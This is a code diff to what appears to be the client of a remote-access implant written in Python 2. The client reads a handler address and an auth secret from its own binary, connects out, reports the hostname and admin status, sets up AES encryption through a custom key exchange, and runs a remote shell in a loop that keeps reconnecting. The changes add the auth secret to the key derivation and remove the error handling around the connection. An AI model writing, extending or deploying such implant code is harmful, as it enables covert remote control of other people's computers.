@@ -42,10 +42,17 @@ try:
 		port2 = ord(f.read(1))
 		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
 		HANDLER_IP = HANDLER_IP[:-1]
+		
+		f.seek(930)
+		AUTH_SECRET = f.read(30)
 except Exception as e:
 	logging.debug("We're uncompyled, let's use these values...")
 	HANDLER_IP = "127.0.0.1"
 	HANDLER_PORT = 8080
+	with open("stelf.guid", "rb") as f:
+		AUTH_SECRET = f.read()
+		
+logging.debug("Handler is at "+str(HANDLER_IP)+":"+str(HANDLER_PORT)+", auth key is "+AUTH_SECRET)
 
 def windows_only(func):
 	"""
@@ -225,9 +232,10 @@ class Transport:
 	""""
 	Transport handles connecting to the handler, managing channels, and communicating with the handler. One thread receives data, checks which channel it should be forwarded to, and puts it on the correct queue. Another gets data from a queue all channels write to, and sends it to the handler.
 	"""
-	def __init__(self, handler_ip, handler_port):
+	def __init__(self, handler_ip, handler_port, key):
 		self.handler_ip = handler_ip
 		self.handler_port = handler_port
+		self.auth_key = key
 		
 		self.comm_socket = socket.socket()
 		
@@ -242,26 +250,26 @@ class Transport:
 		
 	def connect(self):
 		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
-		try:
-			self.comm_socket.connect((self.handler_ip, self.handler_port))
-			logging.info("Connected!")
-			self.comm_socket.sendall(chr(255)*30)
-			time.sleep(random.randint(100,500)/100) # Waiting a random amount of time since multiple clients
-			self.aes_obj = self.dh_exchange() # connecting at the exact same time causes the handler to hang
+		#try:
+		self.comm_socket.connect((self.handler_ip, self.handler_port))
+		logging.info("Connected!")
+		self.comm_socket.sendall(chr(255)*30)
+		time.sleep(random.randint(100,500)/100) # Waiting a random amount of time since multiple clients
+		self.aes_obj = self.dh_exchange() # connecting at the exact same time causes the handler to hang
+		
+		data = socket.gethostname()+"|"+str(misc.isadmin())
+		
+		self.comm_socket.sendall(data)
+		
+		for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
+			t = StoppableThread(target=f)
+			t.daemon = True
+			t.start()
 			
-			data = socket.gethostname()+"|"+str(misc.isadmin())
-			
-			self.comm_socket.sendall(data)
-			
-			for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
-				t = StoppableThread(target=f)
-				t.daemon = True
-				t.start()
-				
-			return True
-		except Exception as e:
-			logging.warn("Failed to connect to handler: "+str(e))
-			return False
+		return True
+		#except Exception as e:
+		#	logging.warn("Failed to connect to handler: "+str(e))
+		#	return False
 			
 	def dh_exchange(self):
 		"""
@@ -279,14 +287,14 @@ class Transport:
 		
 		sharedSecret = pow(int(server_key), private_key, modulus)
 		
-		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
+		hash = str(hashlib.sha256(str(str(sharedSecret)+str(self.auth_key)+str(self.comm_socket.getsockname()[1]))).hexdigest())
 		key = hash[:32]
 		IV = hash[-16:]
 		
 		logging.info("Key: "+key+", IV: "+IV)
 		
 		return AES.new(key, AES.MODE_CFB, IV)
-			
+
 	def encrypt(self, data):
 		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
 		
@@ -786,7 +794,7 @@ help - This menu!
 		return self.channel.read_input()
 		
 while True:
-	shell = Shell(Transport(HANDLER_IP,HANDLER_PORT))
+	shell = Shell(Transport(HANDLER_IP,HANDLER_PORT, AUTH_SECRET))
 	if not shell.run():
 		del shell
 		for t in threading.enumerate():
